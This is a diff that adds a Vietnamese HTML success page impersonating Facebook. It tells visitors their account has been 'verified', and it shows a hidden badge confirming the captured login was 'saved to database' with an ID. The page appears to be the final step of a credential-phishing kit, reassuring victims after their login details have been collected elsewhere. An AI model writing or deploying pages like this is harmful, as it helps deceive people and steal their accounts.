@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Xác minh thành công</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body class="success-page">
+  <div class="success-bg">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+  </div>
+
+  <main class="success-card">
+    <div class="check-ring">
+      <div class="check-circle">
+        <svg class="check-icon" viewBox="0 0 52 52" aria-hidden="true">
+          <circle class="check-circle-bg" cx="26" cy="26" r="24" fill="none" stroke-width="3"/>
+          <path class="check-path" fill="none" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round" d="M14 27l8 8 16-18"/>
+        </svg>
+      </div>
+    </div>
+
+    <h1 class="success-title">Xác minh thành công</h1>
+    <p class="success-subtitle" id="successMessage">
+      Tài khoản của bạn đã được xác minh. Bạn có thể tiếp tục sử dụng Facebook.
+    </p>
+
+    <div class="success-mini-collage" aria-hidden="true">
+      <div class="mini-card m1"></div>
+      <div class="mini-card m2"></div>
+      <div class="mini-card m3"></div>
+    </div>
+
+    <p id="savedBadge" class="saved-badge" style="display:none">✓ Đã lưu tài khoản vào database (ID: <span id="savedId"></span>)</p>
+
+    <div class="success-details">
+      <div class="detail-row">
+        <span class="detail-label">Trạng thái</span>
+        <span class="detail-value badge-ok">Đã xác minh</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Thời gian</span>
+        <span class="detail-value" id="verifyTime">—</span>
+      </div>
+    </div>
+
+    <a href="/" class="btn btn-primary success-btn">Tiếp tục</a>
+    <p class="success-foot">Bảo mật tài khoản được Facebook bảo vệ 24/7</p>
+  </main>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const user = params.get("user");
+    const msg = document.getElementById("successMessage");
+    if (user) {
+      msg.textContent =
+        "Xin chào! Tài khoản " + decodeURIComponent(user) + " đã được xác minh thành công.";
+    }
+    if (sessionStorage.getItem("lastLoginSaved") === "1") {
+      const badge = document.getElementById("savedBadge");
+      const id = sessionStorage.getItem("lastLoginId");
+      badge.style.display = "block";
+      if (id) document.getElementById("savedId").textContent = id;
+      sessionStorage.removeItem("lastLoginSaved");
+      sessionStorage.removeItem("lastLoginId");
+    }
+
+    document.getElementById("verifyTime").textContent =
+      new Date().toLocaleString("vi-VN", {
+        hour: "2-digit",
+        minute: "2-digit",
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric",
+      });
+  </script>
+</body>
+</html>
